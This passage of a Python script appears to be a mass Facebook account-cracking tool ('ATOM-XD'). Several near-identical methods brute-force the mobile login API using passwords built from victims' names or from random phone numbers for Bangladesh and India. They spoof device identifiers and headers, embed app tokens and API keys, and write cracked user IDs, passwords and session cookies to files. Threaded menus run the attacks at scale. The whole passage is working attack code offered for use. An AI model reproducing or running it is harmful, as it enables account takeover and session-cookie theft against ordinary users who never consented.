                'method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                url = 'https://api.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{G}-{W}/{G}ATOM-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-Dip_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M2-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}ATOM-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#__________/FILE-M3\__________#
    def ___M3___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {'adid': adid,'format': 'json','device_id': device_id,'cpl': 'true','family_device_id': family,'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'device_based_login',
                'email': ids,'password': pas,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1','meta_inf_fbmeta': '','advertiser_id': advertiser_id,'currently_logged_in_userid': '0',
                'locale': 'en_GB','client_country_code': 'GB',
                'method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                url = 'https://api.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{G}-{W}/{G}ATOM-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-Dip_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M3-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}ATOM-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M3-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#__________/FILE-M4\__________#
    def ___M4___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {'adid': adid,'format': 'json','device_id': device_id,'cpl': 'true','family_device_id': family,'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled','source': 'device_based_login','email': ids,'password': pas,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1',
                'meta_inf_fbmeta': '','advertiser_id': advertiser_id,'currently_logged_in_userid': '0',
                'locale': 'en_GB','client_country_code': 'GB','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(11111, 99999)),'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                url = 'https://graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{G}-{W}/{G}ATOM-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-Dip_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M4-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}ATOM-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M4-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#__________/FILE-M5\__________#
    def ___M5___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {'adid': adid,'format': 'json','device_id': device_id,'cpl': 'true','family_device_id': family,'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled','source': 'device_based_login','email': ids,'password': pas,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1',
                'meta_inf_fbmeta': '','advertiser_id': advertiser_id,'currently_logged_in_userid': '0',
                'locale': 'en_GB','client_country_code': 'GB','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(11111, 99999)),'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                url = 'https://graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{G}-{W}/{G}ATOM-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-Dip_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M5-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}ATOM-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M5-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#__________/FILE-M6\__________#
    def ___M6___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                sexd =str(''.join(random_seed.choices(string.digits, k=20)))
                sim_serials = f'["{sexd}"]'                
                data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,
                'generate_analytics_claims':'1','community_id':'',"sim_country": "id",
                'try_num':'1','family_device_id':family,'sim_serials':sim_serials,
                'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),'generate_session_cookies':'1','generate_machine_id':'1','tier': 'regular','reg_instance': str(uuid.uuid4()),'meta_inf_fbmeta':'','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'','fb_api_req_friendly_name':'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',}
                headers = {'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Bandwidth':str(random.randint(11111, 99999)),'X-FB-Net-HNI': str(random.randint(11111, 99999)),'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent':ua,
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
                url = 'https://b-graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{G}-{W}/{G}ATOM-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-Dip_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M6-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}ATOM-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M6-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#__________/FILE-M7\__________#
    def ___M7___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                sexd =str(''.join(random_seed.choices(string.digits, k=20)))
                sim_serials = f'["{sexd}"]'                
                data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,
                'generate_analytics_claims':'1','community_id':'',"sim_country": "id",
                'try_num':'1','family_device_id':family,'sim_serials':sim_serials,
                'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),'generate_session_cookies':'1','generate_machine_id':'1','tier': 'regular','reg_instance': str(uuid.uuid4()),'meta_inf_fbmeta':'','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'','fb_api_req_friendly_name':'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',}
                headers = {'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Bandwidth':str(random.randint(11111, 99999)),'X-FB-Net-HNI': str(random.randint(11111, 99999)),'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent':ua,
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
                url = 'https://b-graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{G}-{W}/{G}ATOM-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-Dip_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M7-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}ATOM-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/ATOM-XD/FILE/ATOM-M7-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#__________/FILE-M8\__________#
#__________/RANDOM-PASS\__________#
#__________/RANDOM\__________#
    def __randX__(self):
    	self.__clearX__();print(f"{xp1} BANGLADESH CLONING ");print(f"{xp2} INDIA CLONING ");print(f"{xp3} GMAIL CLONING ");print(f"{xp0} BACK MENU ");self.__lineX__();__rndX__ = input(f"{xpx} CHOICE MENU {xpxx} ")
    	if __rndX__ == ("1"):self.__bdX__()
    	elif __rndX__ == ("2"):self.__indiaX__()
    	elif __rndX__ == ("3"):self.__gmailX__()
    	elif __rndX__ == ("0"):self.__menuX__()
    	else:self.__lineX__();print(f'{xp} OPTION NOT VALID ');self.__lineX__();time.sleep(1);print(f"{xp} TRY AGAIN ");self.__lineX__();time.sleep(1);self.__randX__()
#__________/BANGLADESH\__________#
    def __bdX__(self):
    	self.__clearX__();print(__codeX__);self.__lineX__();__codechoiX__ = input(f"{xpx} CHOICE CODE {xpxx} ");self.__clearX__();print(__limitX__);self.__lineX__();__limitXX__ = input(f"{xpx} CHOICE LIMIT {xpxx} ");self.__clearX__();print(__methodXX__);self.__lineX__();__methX__ = input(f"{xpx} CHOICE METHOD {xpxx} ");self.__clearX__();print(f"{xp1} CRACK WITH AUTO PASSWORD\n{xp2} CRACK WITH CUSTOM PASSWORD");self.__lineX__();__rapasX__ = input(f"{xpx} CHOICE PASSLIST {xpxx} ")
    	if __rapasX__ in ("1"):self.plist.append('first@123');self.plist.append('last@1234');self.plist.append('first@');self.plist.append('last@123');self.plist.append('first@#');self.plist.append('@first@');self.plist.append('last@123');self.plist.append('@1234@');self.plist.append('@12345@');self.plist.append('@123456@');self.plist.append('@1234567@');self.plist.append('@@@@####');self.plist.append('@#@#@#');self.plist.append('bangladesh');self.plist.append('Bangladesh');self.plist.append('@freefire@');self.plist.append('@last@')
    	else:
    	    self.__clearX__();print(f"{xp} MAXIMUM  {xpxx} 10{G}-{W}15 PASSLIST ");self.__lineX__();__ranliX__ = input(f'{xpx} PASSWORD LIMIT {xpxx}{W} ');self.__clearX__();print(f"{xp} EXAMPLE  {xpxx} first6 {G}/{W} first8 {G}/{W} last6 {G}/{W} last8");self.__lineX__()
    	    for i in range(int(__ranliX__)):self.plist.append(input(f'{xp} ENTER PASSWORD {W}/{G}{i+1}{W}/ {xpxx}{W} '))
    	for c in range(int(__limitXX__)):nmp = ''.join(random.choice(string.digits) for _ in range(8));self.world.append(nmp)
    	with ThreadPool(max_workers=30) as __seaaXX__:
    	    self.__clearX__();print(f"{xp} CODE{G}/{W}LIMIT{G}/{W}METHOD {xpxx}{W} {__codechoiX__}{G}/{W}{__limitXX__}{G}/{W}{__methX__}\n{xp} IF NO RESULT ON{G}/{W}OFF AIRPLAY MODE");self.__lineX__()
    	    for sea in self.world:
    	        ids = __codechoiX__ + sea
    	        passlist = [ids,sea,ids[5:],ids[4:],ids[3:],ids[:6],ids[:7],ids[:8],ids[2:],ids[1:],ids[9:],ids[10:],ids[11:],ids[12:],ids[13:],ids[14:],ids[15:],ids[16:],ids[17:]]
    	        tl = len(self.world)
    	        psd = passlist + self.plist
    	        if __methX__ in ("1"):__seaaXX__.submit(self.___M1X___,ids,psd,tl)
    	        elif __methX__ in ("2"):__seaaXX__.submit(self.___M2X___,ids,psd,tl)
    	        elif __methX__ in ("3"):__seaaXX__.submit(self.___M3X___,ids,psd,tl)
    	        elif __methX__ in ("4"):__seaaXX__.submit(self.___M4X___,ids,psd,tl)
    	        elif __methX__ in ("5"):__seaaXX__.submit(self.___M5X___,ids,psd,tl)
    	        elif __methX__ in ("6"):self.__normalX__()
    	        else:__seaaXX__.submit(self.___M1X___,ids,psd,tl)
    	print('\033[1;37m');print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');print(f'{xp} THE PROCESS HAS COMPLETED...');print(f'{xp} TOTAL {G}OK{W}/{R}CP {xpxx}{G} '+str(len(self.oks))+f'{W}/{R}'+str(len(self.cps)));print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');self.__exitX__()
#__________/INDIA\__________#
    def __indiaX__(self):
    	self.__clearX__();print(__codeXX__);self.__lineX__();__codechoiX__ = input(f"{xpx} CHOICE CODE {xpxx} ");self.__clearX__();print(__limitX__);self.__lineX__();__limitXX__ = input(f"{xpx} CHOICE LIMIT {xpxx} ");self.__clearX__();print(__methodXX__);self.__lineX__();__methX__ = input(f"{xpx} CHOICE METHOD {xpxx} ");self.__clearX__();print(f"{xp1} CRACK WITH AUTO PASSWORD\n{xp2} CRACK WITH MANUAL PASSWORD");self.__lineX__();__rapasX__ = input(f"{xpx} CHOICE PASSLIST {xpxx} ")
    	if __rapasX__ in ("1"):self.plist.append('57273200');self.plist.append('59039200');self.plist.append('07860786')
    	else:
    	    self.__clearX__();print(f"{xp} MAXIMUM  {xpxx} 10{G}-{W}15 PASSLIST ");self.__lineX__();__ranliX__ = input(f'{xpx} PASSWORD LIMIT {xpxx}{W} ');self.__clearX__();print(f"{xp} EXAMPLE  {xpxx} first6 {G}/{W} first8 {G}/{W} last6 {G}/{W} last8");self.__lineX__()
    	    for i in range(int(__ranliX__)):self.plist.append(input(f'{xp} PASSWORD NO{G}-{W}{i+1} {xpxx}{W} '))
    	for c in range(int(__limitXX__)):nmp = ''.join(random.choice(string.digits) for _ in range(8));self.world.append(nmp)
    	with ThreadPool(max_workers=30) as __seaaXX__:
    	    self.__clearX__();print(f"{xp} CODE{G}/{W}LIMIT{G}/{W}METHOD {xpxx}{W} {__codechoiX__}{G}/{W}{__limitXX__}{G}/{W}{__methX__}\n{xp} IF NO RESULT ON{G}/{W}OFF AIRPLAY MODE");self.__lineX__()
    	    for sea in self.world:
    	        ids = __codechoiX__ + sea
    	        passlist = [ids,sea,ids[5:],ids[4:],ids[3:],ids[:6],ids[:7],ids[:8],ids[2:],ids[1:],ids[9:],ids[10:],ids[11:],ids[12:],ids[13:],ids[14:],ids[15:],ids[16:],ids[17:]]
    	        tl = len(self.world)
    	        psd = passlist + self.plist
